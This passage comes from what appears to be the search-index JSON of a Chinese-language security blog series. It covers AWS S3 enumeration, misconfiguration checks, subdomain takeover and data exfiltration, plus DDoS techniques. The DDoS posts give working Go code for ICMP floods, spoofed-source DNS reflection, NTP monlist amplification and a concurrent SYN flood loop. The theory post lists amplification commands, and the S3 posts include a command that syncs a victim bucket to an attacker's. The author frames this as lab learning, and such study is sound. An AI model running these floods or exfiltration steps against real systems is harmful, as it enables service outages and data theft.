bucket，再次訪問subdomain，如果成功印出上傳的網頁，算是接管成功！\n","date":"2023-10-01T00:00:00Z","permalink":"http://localhost:1313/p/day-18-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-s3-takeover-poc/","title":"[Day 18] 天堂雲端 - S3 takeover POC"},{"content":"NTP NTP（Network Time Protocol）網路時間協議，用來同步主機時間的網路協議。\nNTP Monlist NTP有一個monitor功能，也被稱為MON_GETLIST。這個功能為監控伺服器。NTP服務器收到monlist後就會返回與NTP服務器同步過的最後600個客戶端IP。 可以在客戶端主機輸入以下command line測試：\n1 ntpdc -n -c monlist x.x.x.x | wc -l 輸出為收到的數據行數\n如何避免 禁用monlist: 將ntp server升級到4.2.7p26或更高版本，在4.2.7前的版本，在配置檔設定disable monitor禁用monlist功能。\ncode ntp跟dns查詢一樣是發送udp封包，把payload修改一下就可以了\n1 2 3 4 5 ntpdcMonlistQuery := []byte{ 0x17, 0x00, 0x03, 0x2a, // NTPDC Request Header // Monlist Query 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Cookie } 目標主機攔截封包 1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt; sudo tcpdump -i eth0 host 10.211.55.10 and port 123 -v 03:02:08.524364 IP (tos 0x10, ttl 64, id 43750, offset 0, flags [DF], proto UDP (17), length 76) ubuntu-linux-20-04-desktop.38707 \u0026gt; prod-ntp-5.ntp1.ps5.canonical.com.ntp: NTPv4, length 48 Client, Leap indicator: (0), Stratum 0 (unspecified), poll 0 (1s), precision 0 Root Delay: 0.000000, Root dispersion: 0.000000, Reference-ID: (unspec) Reference Timestamp: 0.000000000 Originator Timestamp: 0.000000000 Receive Timestamp: 0.000000000 Transmit Timestamp: 3905175728.121997727 (2023/10/02 03:02:08) Originator - Receive Timestamp: 0.000000000 Originator - Transmit Timestamp: 3905175728.121997727 (2023/10/02 03:02:08) ... 試了一下，目標主機收到大量時間校正封包\u0026hellip;\n","date":"2023-10-01T00:00:00Z","permalink":"http://localhost:1313/p/day-18-%E9%96%91%E8%91%97%E6%B2%92%E4%BA%8B-ntp-%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A/","title":"[Day 18] 閑著沒事 - NTP 反射攻擊"},{"content":"Misconfiguration 配置錯誤\n常見的S3 bucket 配置錯誤 透過ACL公開存取權限 透過策略公開存取權限 注：ACL（Access Control List）為S3物件（Object）提供簡單的權限控制，包括私有、公開讀取及公開讀寫。策略（Policy）適用於整個S3 bucket，允許更複雜靈活的方式定義訪問權限，通常以JSON格式創建自定義權限。\n伺服器端無加密檔案 AWS S3預設加密隨時隨地都保持啟用狀態，而且至少採用SSE-S3進行伺服器加密，SSE-S3是免費的。在AWS S3物件上傳前加密，下載前解密。確定保持加密狀態已符合大部分資安規範框架。 S3無啟用日誌紀錄 沒有日誌紀錄就無法追蹤事件歷史紀錄，日誌紀錄在所有合規性框架/標準中都是必不可少的。 POC An AWS S3 misconfiguration simple POC (Proof of Concept) for checking public access, read access, and write access.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws/session\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/service/s3\u0026#34; ) var response http.Response func main() { // s3 bucket name bucketName := \u0026#34;YOUR_S3_BUCKET_NAME\u0026#34; // Create a Session sess := session.Must(session.NewSessionWithOptions(session.Options{ SharedConfigState: session.SharedConfigEnable, })) // S3 client svc := s3.New(sess) // Check if s3 bucket is public url := \u0026#34;https://\u0026#34; + bucketName + \u0026#34;.s3.amazonaws.com/\u0026#34; // send http request response, err := http.Get(url) if err != nil { fmt.Println(\u0026#34;Http request err:\u0026#34;, err) os.Exit(1) } defer response.Body.Close() // Get status code if response.StatusCode == http.StatusOK { fmt.Printf(\u0026#34;This s3 bucket %s is public!\\n\u0026#34;, bucketName) } else if response.StatusCode == http.StatusNotFound { fmt.Printf(\u0026#34;This s3 bucket %s is public!\\n\u0026#34;, url) } else { fmt.Printf(\u0026#34;%s: Unknown status code %d\\n\u0026#34;, url, response.StatusCode) } // Check if s3 bucket can list object if listObjectsInBucket(response) { fmt.Printf(\u0026#34;This s3 bucket %s can list object!\\n\u0026#34;, bucketName) } else { fmt.Printf(\u0026#34;This s3 bucket %s can not list object!\\n\u0026#34;, bucketName) os.Exit(1) } // Check if s3 bucket can upload object if canModifyObject(svc, bucketName, \u0026#34;S3/test.txt\u0026#34;) { fmt.Printf(\u0026#34;This s3 bucket %s can upload object!\\n\u0026#34;, bucketName) } else { fmt.Printf(\u0026#34;This s3 bucket %s can not upload object!\\n\u0026#34;, bucketName) os.Exit(1) } } // check s3 bucket have ListObject func listObjectsInBucket(response *http.Response) bool { body, err := io.ReadAll(response.Body) if err != nil { fmt.Println(\u0026#34;ReadAll err:\u0026#34;, err) } if strings.Contains(string(body), \u0026#34;ListBucketResult\u0026#34;) { return true } else { return false } } // check s3 bucket have WriteObject (can upload or modify files) func canModifyObject(svc *s3.S3, bucketName string, filePath string) bool { file, err := os.Open(filePath) if err != nil { fmt.Println(\u0026#34;Open file err:\u0026#34;, err) return false } defer file.Close() input := \u0026amp;s3.PutObjectInput{ Body: file, Bucket: aws.String(bucketName), Key: aws.String(\u0026#34;test\u0026#34;), } input.Body = file _, err = svc.PutObject(input) if err != nil { fmt.Println(\u0026#34;Failed to upload file.\u0026#34;) return false } return true } ","date":"2023-09-30T00:00:00Z","permalink":"http://localhost:1313/p/day-17-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-aws-s3-misconfigurationpoc/","title":"[Day 17] 天堂雲端 - AWS S3 Misconfiguration\u0026POC"},{"content":"DNS反射攻擊 攻擊手法 攻擊者向反射服務器發送解析DNS request，反射服務器向目標主機發送大量的DNS response回覆給目標主機，造成攻擊者只要發送一點流量就能使目標主機收到大量的無意義的封包流量攻擊。\n原理 DNS反射攻擊的原理是一種提供查詢並回覆查詢的方式，這是一種DNS設計上的缺陷。攻擊者透過假查詢及假來源向反射服務器發送封包，反射服務器依照假來源上面的IP位址向目標主機發送大量DNS response封包。\ndnsReflect.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 package reflect import ( \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { var ( device string = \u0026#34;bridge100\u0026#34; snapshotLen int32 = 1024 promiscuous bool = false err error timeout time.Duration = 10 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer random *rand.Rand ) handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout) if err != nil { log.Fatal(err) } defer handle.Close() random = rand.New(rand.NewSource(time.Now().UnixNano())) srcPort := layers.UDPPort(random.Intn(65535)) dstPort := layers.UDPPort(12345) ethernetLayer := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, DstMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, EthernetType: layers.EthernetTypeIPv4, } ipLayer := \u0026amp;layers.IPv4{ SrcIP: net.IP{10, 211, 55, 3}, DstIP: net.IP{8, 8, 8, 8}, Version: 4, TTL: 64, Protocol: layers.IPProtocolUDP, } udpLayer := \u0026amp;layers.UDP{ SrcPort: srcPort, DstPort: dstPort, } udpLayer.SetNetworkLayerForChecksum(ipLayer) // DNS query dnsQuery := []byte{ 0x00, 0x01, // Transaction ID 0x01, 0x00, // Flags: Standard Query 0x00, 0x01, // Questions 0x00, 0x00, // Answers 0x00, 0x00, // Authority 0x00, 0x00, // Additional 0x03, \u0026#39;w\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;w\u0026#39;, // QNAME: www # 以www.example.com dns為例，我手上沒有dns可以查詢 0x05, \u0026#39;e\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;e\u0026#39;, // QNAME: example 0x03, \u0026#39;c\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;m\u0026#39;, // QNAME: com 0x00, // Null terminator of QNAME 0x00, 0x01, // QTYPE: A (IPv4 address) 0x00, 0x01, // QCLASS: IN (Internet) } payload := dnsQuery buffer = gopacket.NewSerializeBuffer() opts := gopacket.SerializeOptions{ FixLengths: true, ComputeChecksums: true, } if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload)); err != nil { log.Fatal(err) } udpPacket := buffer.Bytes() err = handle.WritePacketData(udpPacket) if err != nil { log.Fatal(err) } } ","date":"2023-09-30T00:00:00Z","permalink":"http://localhost:1313/p/day-17-%E9%96%91%E8%91%97%E6%B2%92%E4%BA%8B-dns%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A/","title":"[Day 17] 閑著沒事 - DNS反射攻擊"},{"content":"Enumerate S3 Web endpoint S3 web endpoint組成：https://{BUCKET_NAME}.s3.amazonaws.com/ enumerate（枚舉）所有可能的名詞組合建立出來的S3 bucket是否是公開存取的？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // set wordlist to enumerate all s3-buckets package main import ( \u0026#34;bufio\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func main() { // open wordlist file file, err := os.Open(\u0026#34;S3/wordlist.txt\u0026#34;) # File here! if err != nil { fmt.Println(\u0026#34;Failed to open wordlist file:\u0026#34;, err) return } defer file.Close() scanner := bufio.NewScanner(file) for scanner.Scan() { // get wordlist word := scanner.Text() // build s3 web endpoint url := \u0026#34;https://\u0026#34; + word + \u0026#34;.s3.amazonaws.com/\u0026#34; // send http request response, err := http.Get(url) if err != nil { fmt.Println(\u0026#34;Http request err:\u0026#34;, err) return } defer response.Body.Close() // Get status code if response.StatusCode == http.StatusOK { fmt.Printf(\u0026#34;%s: S3 bucket is exist!\\n\u0026#34;, url) } else if response.StatusCode == http.StatusNotFound { fmt.Printf(\u0026#34;%s: S3 bucket is not exist\\n\u0026#34;, url) } else { fmt.Printf(\u0026#34;%s: Unknown status code %d\\n\u0026#34;, url, response.StatusCode) } } if err := scanner.Err(); err != nil { fmt.Println(\u0026#34;scanner err:\u0026#34;, err) } } ","date":"2023-09-29T00:00:00Z","permalink":"http://localhost:1313/p/day-16-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-aws-s3-enumerate-poc/","title":"[Day 16] 天堂雲端 - AWS S3 Enumerate POC"},{"content":"什麼是反射攻擊 反射攻擊指的就是利用大量代理伺服器或是開放的資源來放大流量，通常使用允許小的request生成大量的response，這些response會被重定向的目標伺服器\n步驟 攻擊者準備已被控制的合法伺服器，作為反射服務器 攻擊者向這些反射服務器發送request，來源地址偽裝成目標地址。通常使用UDP封包，因為UDP不需連接即可發送。 攻擊者選定一些適合做反射攻擊的協議，可以以小博大。例如DNS、NTP、SSDP、CLDAP、Memcached、CharGen 或 QOTD。 DNS反射攻擊 攻擊者向反射服務器發送解析DNS request，反射服務器向目標主機發送大量的DNS response回覆給目標主機 例如:\n1 \u0026gt; dig ANY http://{TARGET HOST} @x.x.x.x NTP反射攻擊 NTP : 通過網路協議使主機時間同步化 攻擊者利用偽造的IP地址向NTP（Network Time Protocol/網路時間協議）反射伺服器發送Request\n1 \u0026gt; ntpdc -n -c monlist x.x.x.x | wc -l SSDP反射攻擊 攻擊者使用偽造的IP地址向SSDP（Simple Service Discovery Protocol/簡單服務發現協議）伺服器發送Request SSDP用於Universal Plug and Play（UPnP）設備上，用來發現設備。特別應用在物聯網及智能家電上。 （我沒有需要UPnP的設備，端口打不開，先跳過） 如果需要測試的話可以先用nmap測試是否可以收到response\n1 nmap x.x.x.x -p 1900 -sU --script=upnp-info SNMP反射攻擊 攻擊者利用偽造的IP地址向SNMP（Simple Network Management Protocol/簡單網絡管理協議）伺服器發送請求\nChargen反射攻擊 Chargen是一個用於測試的協議，攻擊者可以使用偽造的IP地址向Chargen伺服器發送Request，伺服器將以無限數據流形式回應。 查看port 19是否有chargen服務傳輸字元\n1 telnet -r localhost 19 LDAP放大攻擊 攻擊者使用偽造的IP地址向LDAP（輕量級目錄訪問協議）伺服器發送Request\nCLDAP 攻擊者使用偽造的IP地址向CLDAP（無連接輕量級目錄訪問協議）伺服器發送Request\nMemcached反射攻擊 攻擊者利用Memcached伺服器中存儲的大量數據，將攻擊目標的IP地址偽造為請求的來源，然後發送一個小的請求，Memcached伺服器會回應大量數據到目標IP地址。\nQOTD 攻擊者使用偽造的IP地址向QOTD（每日引言）伺服器發送Request 聽起來很怪但是出現在2021 cloudflare ddos報告中..\n","date":"2023-09-29T00:00:00Z","permalink":"http://localhost:1313/p/day-16-%E9%96%91%E8%91%97%E6%B2%92%E4%BA%8B-%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A%E7%90%86%E8%AB%96/","title":"[Day 16] 閑著沒事 - 反射攻擊理論"},{"content":"AWS S3 複寫策略(Replication Policies) AWS S3 replication policy - 使用 Amazon S3 複寫在 AWS 區域內和區域間複寫資料。S3是一個高彈性、全受管、低成本的雲端服務，而複寫策略(Replication Policies)可以使得S3 bucket在不同的bucket或是不同帳戶下的bucket間複寫物件(object)。\n注：如果兩個bucket要進行複寫，兩個bucket都要啟用版本控制。\nMisconfiguration 配置錯誤引發的資料外洩，以下是權限都打開的配置。\nTrust policy 在定義role的時候設定trust policy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;Service\u0026#34;: [ \u0026#34;s3.amazonaws.com\u0026#34;, \u0026#34;batchoperations.s3.amazonaws.com\u0026#34; # 支援S3批次操作 ] }, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34; } ] } AWS IAM roles 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:ListBucket\u0026#34;, \u0026#34;s3:GetReplicationConfiguration\u0026#34;, \u0026#34;s3:PutInventoryConfiguration\u0026#34;, \u0026#34;s3:InitiateReplication\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:GetObjectVersionForReplication\u0026#34;, \u0026#34;s3:GetObjectVersionAcl\u0026#34;, \u0026#34;s3:GetObjectVersionTagging\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:ReplicateObject\u0026#34;, \u0026#34;s3:ReplicateDelete\u0026#34;, \u0026#34;s3:ReplicateTags\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } AWS Cli 模擬攻擊者複寫s3 bucket所有object方法\nlist object - 確認有s3:ListBucket權限 1 % aws s3 ls {AWS_BUCKET_NAME} Get bucket ACL - 查看Object ACL權限 1 % aws s3api get-bucket-acl --bucket {AWS_BUCKET_NAME} Download Object To Local - 嘗試下載檔案 1 % aws s3 sync s3://{AWS_BUCKET_NAME} . Sync Object To another S3 bucket - 把s3 bucket所有資料都複寫到攻擊者創造或感染的s3 bucket 1 % aws s3 sync s3://{SOURCE_BUCKET} s3://{DESTINATION_BUCKET} 注：S3 GetObject調用會記錄在受害者的Cloudtrail數據事件中，但是S3 PutObject調用會記錄在攻擊者的Cloudtrail中，如此，受害者無法在AWS Cloudtrail中看到副本的S3複寫過程。\n","date":"2023-09-28T00:00:00Z","permalink":"http://localhost:1313/p/day-15-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-data-exfiltration-on-s3/","title":"[Day 15] 天堂雲端 - Data Exfiltration on S3"},{"content":"已經大致寫好了SYN、UDP、ACK、ICMP封包\n先把做好的封包都做整理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package packet // tcp packet func // udp packet func // ack packet func // icmp packet func // connectTo func // syn, // sendTo func // udp, icmp // sendPacketData (gopacket) // ack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package main // @title buildSynPacket // @description Build a syn packet with sys/unix // @auth Sunny Tsai Time(2023/09/25) // @param targetIP string send to target ip address // @param targetPort int send to target port func buildSynPacket(targetIp string, targetPort int) { err := packet.Syn(targetIp, targetPort) if err != nil { fmt.Println(err) } } ...依此類推 func main() { targetIp := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 var wg sync.WaitGroup defer wg.Done() targetIp := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 // Layer 4 synch := make(chan int) go func() { for { buildSynPacket(targetIp, targetPort) synch \u0026lt;- 1 } }() go func() { countSyn := 0 for { select { case \u0026lt;-synch: countSyn++ } } }() 在main.go裡面增加併發，並記錄syn封包丟出的次數。 今天先寫到這裡，這兩天有點事QQ\n","date":"2023-09-28T00:00:00Z","permalink":"http://localhost:1313/p/day-15-%E9%96%91%E8%91%97%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%AF%ABcode/","title":"[Day 15] 閑著沒事就寫寫code"},{"content":"前天寫道每個S3 bucket object都有唯一的URL訪問路口，格式會長得像這樣： https://{S3_BUCKET_NAME}.s3.amazonaws.com/{FILE_NAME}\n如果在S3 bucket裡面設定了靜態託管服務 設定靜態託管後，會在下方找到S3提供的web endpoint 通常會有兩種形式其中之一：\ns3-網站破折號 (-)\n區域‐http://{S3_BUCKET_NAME}.s3-website-{Region}.amazonaws.com s3-網站點 (.)\n區域‐http://{S3_BUCKET_NAME}.s3-website.{Region}.amazonaws.com 這個S3提供的Web endpoint會導倒配置的靜態文件。\n建立靜態網址 S3 bucket只是託管了靜態檔案，通常不會把這個URL直接提供給公眾用戶，會用DNS Record CNAME將域名指向S3 Web endpoint。\n自訂網域與S3 Web endpoint 把這個Web endpoint指向自定義的DNS 通常DNS Record會長這樣\n1 CNAME subdomain.example.com http://S3_BUCKET_WEB_ENDPOINT 突然有一天，這個S3 bucket不用了 不要問我為什麼，不用了就是不用了，刪掉這個S3 bucket還可以省錢呢。 然後就把S3 bucket刪掉。咦好像少了什麼？\nDNS Record還留有S3 bucket web point紀錄 S3 bucket刪除了，但DNS Record還留有S3 bucket的web endpoint紀錄 但因為DNS Record也不是都有人在上面看，所以說不定還沒有人知道？\nTakeover 攻擊者掃描整個DNS Record 使用工具（不管是暴力破解還是非暴力破解還是直接掃描DNS Record）找subdomain，獲取整個DNS Record，看看有沒有無人認領的S3 bucket web endpoint。\n如果有找到疑似沒有人在用的S3 bucket web endpoint，訪問web endpoint得到這樣的輸出\n1 2 3 4 5 6 7 8 This XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;The specified bucket does not exist\u0026lt;/Message\u0026gt; \u0026lt;BucketName\u0026gt;XXX\u0026lt;/BucketName\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXXXXXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 代表說攻擊者可以建立一個新的bucket，名稱跟DNS Record上面的一模一樣，完成接管(takeover)，可以用來進行各式各樣的攻擊。\n","date":"2023-09-27T00:00:00Z","permalink":"http://localhost:1313/p/day-14-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-s3-takeover/","title":"[Day 14] 天堂雲端 - S3 takeover"},{"content":"ICMP Flood 攻擊者大量發送icmp(Internet Control Message Protocol)回應請求封包使目標機器不刊負荷，導致正常流量無法進入目標機器。 sysIcmp.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 // @Title sysIcmp.go // @Description Build an icmp packet with sys/unix // @Author Sunny Tsai // @Update 2023-09-27 package packet import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // @title Icmp // @description Build an icmp packet with sys/unix // @auth Sunny Tsai Time(2023/09/27) // @param targetIP string send to target ip address // @return error error func Icmp(targetIP string) error { srcIP := \u0026#34;0.0.0.0\u0026#34; // build socket fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_ICMP) if err != nil { log.Fatal(err) } defer unix.Close(fd) localAddr := \u0026amp;unix.SockaddrInet4{} copy(localAddr.Addr[:], net.ParseIP(srcIP).To4()) err = unix.Bind(fd, localAddr) if err != nil { log.Fatal(err) } // set message message := []byte(\u0026#34;\u0026#34;) remoteAddr := \u0026amp;unix.SockaddrInet4{} copy(remoteAddr.Addr[:], net.ParseIP(targetIP).To4()) sendIcmpTo(fd, message, remoteAddr) return nil } // @title sendIcmpTo // @description Send ICMP packet to target // @auth Sunny Tsai Time(2023/09/27) // @param fd int socket fd // @param message []byte message // @param remoteAddr *unix.SockaddrInet4 remote address func sendIcmpTo(fd int, message []byte, remoteAddr *unix.SockaddrInet4) { icmpPacket := append([]byte{8, 0, 0, 0, 0, 0, 0, 0}, message...) // ICMP类型8表示Echo Request // 计算并设置校验和 checksum := calculateChecksum(icmpPacket) icmpPacket[2] = byte(checksum \u0026gt;\u0026gt; 8) icmpPacket[3] = byte(checksum) _ = unix.Sendto(fd, icmpPacket, 0, remoteAddr) } // @title calculateChecksum // @description Calculate the checksum for ICMP packet // @auth Sunny Tsai Time(2023/09/27) // @param data []byte ICMP packet data // @return uint16 checksum value func calculateChecksum(data []byte) uint16 { sum := uint32(0) // Sum all 16-bit words for i := 0; i \u0026lt; len(data)-1; i += 2 { sum += uint32(data[i+1])\u0026lt;\u0026lt;8 + uint32(data[i]) } // Add carry if any if len(data)%2 != 0 { sum += uint32(data[len(data)-1]) \u0026lt;\u0026lt; 8 } // Fold sum to 16 bits for (sum \u0026gt;\u0026gt; 16) \u0026gt; 0 { sum = (sum \u0026amp; 0xFFFF) + (sum \u0026gt;\u0026gt; 16) } // Take one\u0026#39;s complement checksum := ^uint16(sum) return checksum } ","date":"2023-09-27T00:00:00Z","permalink":"http://localhost:1313/p/day-14-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-icmp-flood%E4%B9%8B%E5%BB%BA%E7%AB%8B%E5%B0%81%E5%8C%85/","title":"[Day 14] 閑的沒事就寫封包 - ICMP Flood之建立封包"},{"content":"S3 Bucket是一個Object Storage Service，當物件(Object)存入Bucket的時候，這個物件(Object)會包含以下三個部分\nKey 檔案名稱（唯一值） Value 物件(Object)內容 Metadata 紀錄物件(Object)相關訊息的資料(ex 上傳時間、修改時間等) 其中，Key代表著獲取檔案URL一個重要關鍵字。上傳後的物件(object)若是可以進行公開存取則訪問的URL會是長這樣：https://{S3_BUCKET_NAME}.s3.amazonaws.com/{KEY}\nBucket Object訪問 公開存取檔案 如果是設定成可以公眾讀取的 開啟物件(object)URL可以正常訪問到檔案。\n非公開存取檔案 如果物件(object)沒有設定公眾權限 訪問URL的時候會出現以下錯誤\n1 2 3 4 5 6 7 This XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;AccessDenied\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;Access Denied\u0026lt;/Message\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXX=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 需要有token、credential跟signature才可以登入\n1 https://{S3_BUCKET_NAME}.s3.{REGION}.amazonaws.com/{KEY}?response-content-disposition=inline\u0026amp;X-Amz-Security-Token=XXX\u0026amp;X-Amz-Algorithm=XXXXXXXX\u0026amp;X-Amz-Date=DATE\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Expires=300\u0026amp;X-Amz-Credential=XXXXXus-east-1%2Fs3%2Faws4_request\u0026amp;X-Amz-Signature=XXX 不存在此檔案 如果輸入一個不存在此檔案的URL，輸出如下\n1 2 3 4 5 6 7 This XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;AccessDenied\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;Access Denied\u0026lt;/Message\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXXXXXX=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 昨天提到隱晦式安全（Security through obscurity）。只要S3 Object配置是公開存取，只有在攻擊者知道S3 bucket URL可訪問。那理論上來說，只要key值越複雜，在某種程度上這個檔案是安全的，不會被攻擊者搜索到；等同於密碼設置越複雜、就越不可能被爆破。但還是不建議這樣做，科技日新月異，保護密碼都進階到2FA、MFA了。爆破S3 bucket下的公開檔案也不是不可能。\nS3 Bucket Enumeration 訪問已存在的S3 bucket，可公開列出所有Object 輸出如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;ListBucketResult xmlns=\u0026#34;http://s3.amazonaws.com/doc/2006-03-01/\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;XXXXXXXX\u0026lt;/Name\u0026gt; \u0026lt;Prefix/\u0026gt; \u0026lt;Marker/\u0026gt; \u0026lt;MaxKeys\u0026gt;1000\u0026lt;/MaxKeys\u0026gt; \u0026lt;IsTruncated\u0026gt;false\u0026lt;/IsTruncated\u0026gt; \u0026lt;Contents\u0026gt; \u0026lt;Key\u0026gt;XXXXXXXXX\u0026lt;/Key\u0026gt; \u0026lt;LastModified\u0026gt;XXXXX\u0026lt;/LastModified\u0026gt; \u0026lt;ETag\u0026gt;\u0026#34;XXXXXXXXX\u0026#34;\u0026lt;/ETag\u0026gt; \u0026lt;Size\u0026gt;...\u0026lt;/Size\u0026gt; \u0026lt;StorageClass\u0026gt;STANDARD\u0026lt;/StorageClass\u0026gt; \u0026lt;/Contents\u0026gt; \u0026lt;Contents\u0026gt; \u0026lt;Key\u0026gt;XXXXXXXXXX\u0026lt;/Key\u0026gt; \u0026lt;LastModified\u0026gt;XXXXX\u0026lt;/LastModified\u0026gt; \u0026lt;ETag\u0026gt;\u0026#34;XXXXXXXXX\u0026#34;\u0026lt;/ETag\u0026gt; \u0026lt;Size\u0026gt;...\u0026lt;/Size\u0026gt; \u0026lt;StorageClass\u0026gt;STANDARD\u0026lt;/StorageClass\u0026gt; \u0026lt;/Contents\u0026gt; \u0026lt;/ListBucketResult\u0026gt; 訪問已存在的S3 bucket，但沒有公眾存取權 輸出如下：\n1 2 3 4 5 6 7 This XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;AccessDenied\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;Access Denied\u0026lt;/Message\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXXXXXx=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 訪問不存在的S3 bucket 輸出如下\n1 2 3 4 5 6 7 8 This XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;The specified bucket does not 